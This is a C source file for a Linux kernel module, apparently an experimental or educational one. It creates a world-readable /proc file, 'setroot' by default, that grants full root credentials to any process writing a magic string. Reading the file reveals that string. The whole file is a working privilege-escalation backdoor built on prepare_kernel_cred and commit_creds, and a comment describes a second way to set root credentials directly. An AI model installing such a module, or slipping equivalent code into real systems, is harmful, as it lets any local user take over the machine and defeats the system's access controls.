/**
 * Create a proc file which enable everyone able to write to it to become root
 */
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/tty.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
/* Commit 7a4e7408c5ca introduced kuid_t and from_uid in Linux 3.5 */
static inline uid_t from_kuid(struct user_namespace *to, uid_t uid)
{
	return uid;
}
#endif

static char *magic = "magic";
module_param(magic, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(magic, "A magic string to become root");

static char *procname = "setroot";
module_param(procname, charp, S_IRUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(procname, "File name in /proc");

static ssize_t
proc_setroot_proc_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
{
	size_t magiclen = strlen(magic);
	if (*ppos + size <= magiclen) {
		if (copy_to_user(buf, magic + *ppos, size))
			return -EFAULT;
	} else if (*ppos < magiclen) {
		/* Copy the end of magic and a "\n" character */
		if (copy_to_user(buf, magic + *ppos, magiclen - *ppos))
			return -EFAULT;
		put_user('\n', buf + magiclen - *ppos);
		WARN_ON(size < magiclen + 1 - *ppos);
		size = magiclen + 1 - *ppos;
	} else {
		return 0;
	}

	pr_info("Someone (uid:%u pid:%d) just read /proc/%s (off %lld size %zu)\n",
		from_kuid(&init_user_ns, current_uid()), current->pid,
		procname, *ppos, size);
	*ppos += size;
	return size;
}

static ssize_t
proc_setroot_proc_write(struct file *file, const char __user *buf, size_t size, loff_t *ppos)
{
	size_t magiclen = strlen(magic);
	char *kbuffer;
	bool is_equal;
	char ttybuffer[sizeof(current->signal->tty->name)];
	struct cred *creds;

	if (*ppos)
		return -EINVAL;
	/* Only accept magic or magic + "\n", so size magiclen or magiclen + 1 */
	if (size != magiclen && size != magiclen + 1)
		return size;

	kbuffer = kmalloc(magiclen + 1, GFP_KERNEL);
	if (!kbuffer)
		return -ENOMEM;

	if (copy_from_user(kbuffer, buf, size)) {
		kfree(kbuffer);
		return -EFAULT;
	}

	/* Compare the magic */
	is_equal = !memcmp(magic, kbuffer, magiclen);
	if (size == magiclen + 1 && kbuffer[magiclen] != '\0' && kbuffer[magiclen] != '\n')
		is_equal = false;
	kfree(kbuffer);

	if (is_equal) {
		pr_info("Giving root credentials to uid:%u, pid:%d, tty:%s\n",
			from_kuid(&init_user_ns, current_uid()), current->pid,
			tty_name(current->signal->tty, ttybuffer));
		creds = prepare_kernel_cred(NULL);
		if (!creds)
			return -ENOMEM;
		/* Another way consists in doing:
		 *   creds = prepare_creds();
		 *   creds->uid = creds->euid = creds->suid = creds->fsuid = GLOBAL_ROOT_UID;
		 *   creds->gid = creds->egid = creds->sgid = creds->fsgid = GLOBAL_ROOT_GID;
		 * ... but this doesn't reset SELinux context to kernel_t
		 */
		commit_creds(creds);
	}
	return size;
}

static const struct file_operations proc_setroot_proc_fops = {
	.owner = THIS_MODULE,
	.read  = proc_setroot_proc_read,
	.write = proc_setroot_proc_write,
};

static int __init proc_setroot_init(void)
{
	struct proc_dir_entry *procfile;

	/* Without CONFIG_PROC_FS, compile but fail at loading time */
	if (!IS_ENABLED(CONFIG_PROC_FS)) {
		pr_alert("This module requires CONFIG_PROC_FS\n");
		return -ENOSYS;
	}

	procfile = proc_create(procname, 0664, NULL, &proc_setroot_proc_fops);
	if (!procfile) {
		remove_proc_entry(procname, NULL);
		pr_alert("Could not initialize /proc/%s\n", procname);
		return -ENOMEM;
	}
	pr_info("Created /proc/%s\n", procname);
	return 0;
}

static void __exit proc_setroot_exit(void)
{
	remove_proc_entry(procname, NULL);
	pr_info("Removed /proc/%s\n", procname);
}

module_init(proc_setroot_init);
module_exit(proc_setroot_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nicolas Iooss");
MODULE_DESCRIPTION("Create a /proc file to become root");
